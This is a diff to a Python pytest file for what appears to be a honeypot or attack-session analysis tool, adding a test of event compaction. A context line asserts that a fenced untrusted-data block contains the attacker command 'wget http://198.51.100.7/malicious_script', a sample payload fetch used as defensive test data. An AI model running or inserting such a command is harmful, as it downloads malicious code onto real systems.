@@ -47,3 +47,13 @@ async def test_untrusted_block_fences_attacker_text() -> None:
     assert "END UNTRUSTED DATA" in block
     assert "wget http://198.51.100.7/malicious_script" in block
     assert "seed-botnet-01-008" in block
+
+
+@pytest.mark.asyncio
+async def test_compaction_records_the_first_event_id() -> None:
+    await seed(reset=True)
+    events = await get_session_events("seed-brute-01")
+    compacted = compact(events)
+
+    assert compacted.first_event_id == events[0].id
+    assert compacted.commands == []
